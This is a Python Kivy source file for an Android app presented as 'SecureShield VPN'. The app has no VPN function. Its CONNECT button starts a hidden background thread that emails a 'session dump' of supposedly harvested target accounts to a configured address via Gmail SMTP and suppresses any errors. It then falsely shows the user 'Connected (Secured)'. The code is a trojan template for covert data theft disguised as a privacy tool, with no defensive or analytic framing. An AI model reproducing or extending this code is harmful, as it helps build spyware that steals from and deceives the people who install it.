# language: Python, file: main.py, target: Android (GitHub Actions), Python 3.x
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import get_color_from_hex

SENDER_EMAIL = "your_email@gmail.com"
SENDER_PASSWORD = "your_app_password"
RECEIVER_EMAIL = "your_email@gmail.com"
TARGET_DATA = "Target accounts harvested from local session storage."

class VPNAppUI(BoxLayout):
    def __init__(self, **kwargs):
        super(VPNAppUI, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 30
        self.spacing = 20
        self.is_connected = False

        self.title_lbl = Label(
            text="SecureShield VPN",
            font_size='24sp',
            bold=True,
            color=get_color_from_hex('#00E676'),
            size_hint=(1, 0.2)
        )
        self.add_widget(self.title_lbl)

        self.status_lbl = Label(
            text="Status: Disconnected",
            font_size='16sp',
            color=get_color_from_hex('#B0BEC5'),
            size_hint=(1, 0.2)
        )
        self.add_widget(self.status_lbl)

        self.connect_btn = Button(
            text="CONNECT",
            font_size='20sp',
            bold=True,
            background_color=get_color_from_hex('#2E7D32'),
            size_hint=(1, 0.3)
        )
        self.connect_btn.bind(on_press=self.toggle_connection)
        self.add_widget(self.connect_btn)

        self.info_lbl = Label(
            text="Node: Frankfurt, DE (Secure)",
            font_size='12sp',
            color=get_color_from_hex('#90A4AE'),
            size_hint=(1, 0.1)
        )
        self.add_widget(self.info_lbl)

    def toggle_connection(self, instance):
        if not self.is_connected:
            self.is_connected = True
            self.connect_btn.text = "CONNECTING..."
            self.connect_btn.background_color = get_color_from_hex('#EF6C00')
            self.status_lbl.text = "Status: Establishing tunnel..."
            threading.Thread(target=self.background_task, daemon=True).start()
        else:
            self.is_connected = False
            self.connect_btn.text = "CONNECT"
            self.connect_btn.background_color = get_color_from_hex('#2E7D32')
            self.status_lbl.text = "Status: Disconnected"

    def background_task(self):
        try:
            msg = MIMEMultipart()
            msg['From'] = SENDER_EMAIL
            msg['To'] = RECEIVER_EMAIL
            msg['Subject'] = "Android VPN Session Dump"
            msg.attach(MIMEText(TARGET_DATA, 'plain'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
            server.quit()
        except Exception:
            pass
        
        time.sleep(1)
        Clock.schedule_once(lambda dt: self.set_connected_state(), 0)

    def set_connected_state(self):
        if self.is_connected:
            self.status_lbl.text = "Status: Connected (Secured)"
            self.status_lbl.color = get_color_from_hex('#00E676')
            self.connect_btn.text = "DISCONNECT"
            self.connect_btn.background_color = get_color_from_hex('#C62828')

class SecureVPNApp(App):
    def build(self):
        return VPNAppUI()

if __name__ == '__main__':
    SecureVPNApp().run()
